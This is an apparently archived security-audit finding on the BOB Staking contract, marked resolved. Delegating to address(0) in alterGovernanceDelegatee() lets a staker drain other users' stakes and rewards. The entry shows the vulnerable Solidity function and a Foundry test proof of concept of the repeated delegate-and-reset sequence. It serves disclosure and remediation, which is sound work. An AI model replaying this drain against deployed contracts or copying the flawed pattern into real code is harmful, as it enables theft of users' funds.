---
tags:
  - lang/solidity
  - sector/governance
  - sector/staking
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - fix/use-reentrancy-guard
protocol: "[[BOB]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/BOB-Staking-security-review_2025-10-18.md"
genome:
  - "[[missing]]"
  - "[[use-reentrancy-guard]]"
  - "[[direct-drain]]"
  - "[[reentrancy-guard]]"
  - "[[reward-accounting]]"
  - "[[vote-delegation-loop]]"
---
# [H-02] Delegating to `address(0)` empties contract via `alterGovernanceDelegatee()`

- id: 63720
- impact: HIGH
- protocol: [[BOB]]-Staking_2025-10-18
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/BOB-Staking-security-review_2025-10-18.md

## Summary


The bug report is about the function `alterGovernanceDelegatee()` which is used to delegate tokens to another user. The severity of the bug is high and the likelihood is medium. The function is supposed to transfer tokens to a delegatee, but there is a flaw that allows an attacker to drain the contract's balance by repeatedly delegating to the zero address and transferring the tokens to a surrogate. To reproduce the issue, a proof of concept (POC) has been provided. The recommendation to fix the issue is to disable delegating to `address(0)`.

## Details


_Resolved_

## Severity

**Impact:** High

**Likelihood:** Medium

## Description

`alterGovernanceDelegatee()` is used to delegate a user’s tokens to a delegatee.
```solidity
function alterGovernanceDelegatee(address newDelegatee) external nonReentrant {
        Staker storage staker = stakers[_stakeMsgSender()];
        if (staker.governanceDelegatee == newDelegatee) revert DelegateeUnchanged();
        if (staker.amountStaked == 0) revert ZeroTokenStake();

        //update rewards before
        _updateUnclaimedRewardsForStaker(_stakeMsgSender());

        DelegationSurrogate newSurrogate = _fetchOrDeploySurrogate(newDelegatee);

        if (staker.governanceDelegatee == address(0)) {
            // First time delegation, staker's tokens are in this contract
            IERC20(stakingToken).safeTransfer(address(newSurrogate), staker.amountStaked);
        } else {
            // Changing delegation, staker's tokens are in the old surrogate
            DelegationSurrogate oldSurrogate = storedSurrogates[staker.governanceDelegatee];
            IERC20(stakingToken).safeTransferFrom(address(oldSurrogate), address(newSurrogate), staker.amountStaked);
        }
        
        staker.amountStaked = staker.amountStaked;  
        staker.governanceDelegatee = newDelegatee;

        emit GovernanceDelegateeAltered(_stakeMsgSender(), newDelegatee);
    }
```
`alterGovernanceDelegatee()` delegates a user’s staked tokens to a delegatee. On a user’s first delegation, tokens are transferred from the contract to a surrogate; on subsequent delegations, tokens are moved between surrogates.

A user who previously delegated can set `newDelegatee = address(0)`. When that happens, the next transfer pulls tokens from the contract balance (which holds other users’ stakes and rewards) rather than from the user’s own staked amount. 

By repeatedly delegating first to a non-zero address and then to `address(0)`, an attacker can progressively drain the contract balance by delegating tokens to the zero address and transferring the tokens to the surrogate.

To reproduce the issue, copy the following POC into `BobStaking.t.sol`.
```solidity
function test_ContractCanBeCompletelyEmptied() public {
       // Deposit reward tokens
        stakingToken.approve(address(stakeContract), 1000 ether);
        stakeContract.depositRewardTokens(1000 ether);

        uint256 stakedAmount = 1 ether;
        vm.prank(stakerOne);
        stakeContract.stake(stakedAmount, stakerOne, 0);

        address delegatee = makeAddr("delegatee one");
        vm.prank(address(this));
        address[] memory whitelistedGovernanceDelegateesToAdd = new address[](1);
        whitelistedGovernanceDelegateesToAdd[0] = delegatee;
        stakeContract.setWhitelistedDelegatees(
            whitelistedGovernanceDelegateesToAdd, new address[](0), new address[](0), new address[](0)
        );

        uint256 timeOfStake = vm.getBlockTimestamp();

        address delegate0 = address(0);

        uint256 contractBalanceBefore = stakingToken.balanceOf(address(stakeContract));

        vm.prank(stakerOne);
        stakeContract.alterGovernanceDelegatee(delegatee);

        uint256 contractBalanceAfter = stakingToken.balanceOf(address(stakeContract));

        //user delegatee correctly the tokens
        assertEq(contractBalanceBefore - contractBalanceAfter, stakedAmount);
        
        //delegates to address(0)
        vm.prank(stakerOne);
        stakeContract.alterGovernanceDelegatee(delegate0);

        vm.prank(stakerOne);
        stakeContract.alterGovernanceDelegatee(delegatee);

        contractBalanceAfter = stakingToken.balanceOf(address(stakeContract));

        //the contract’s balance should remain constant since tokens are only being moved between delegates, but currently this is not happening
        assertEq(contractBalanceBefore - contractBalanceAfter, 2 * stakedAmount);
        //rewards are decreased by 1 ether, but this value should remain constant since it represents reward allocation
        assertEq(stakingToken.balanceOf(address(stakeContract)), 999 ether);
    }
```

## Recommendations
To fix the issue, disable delegating to `address(0)`.
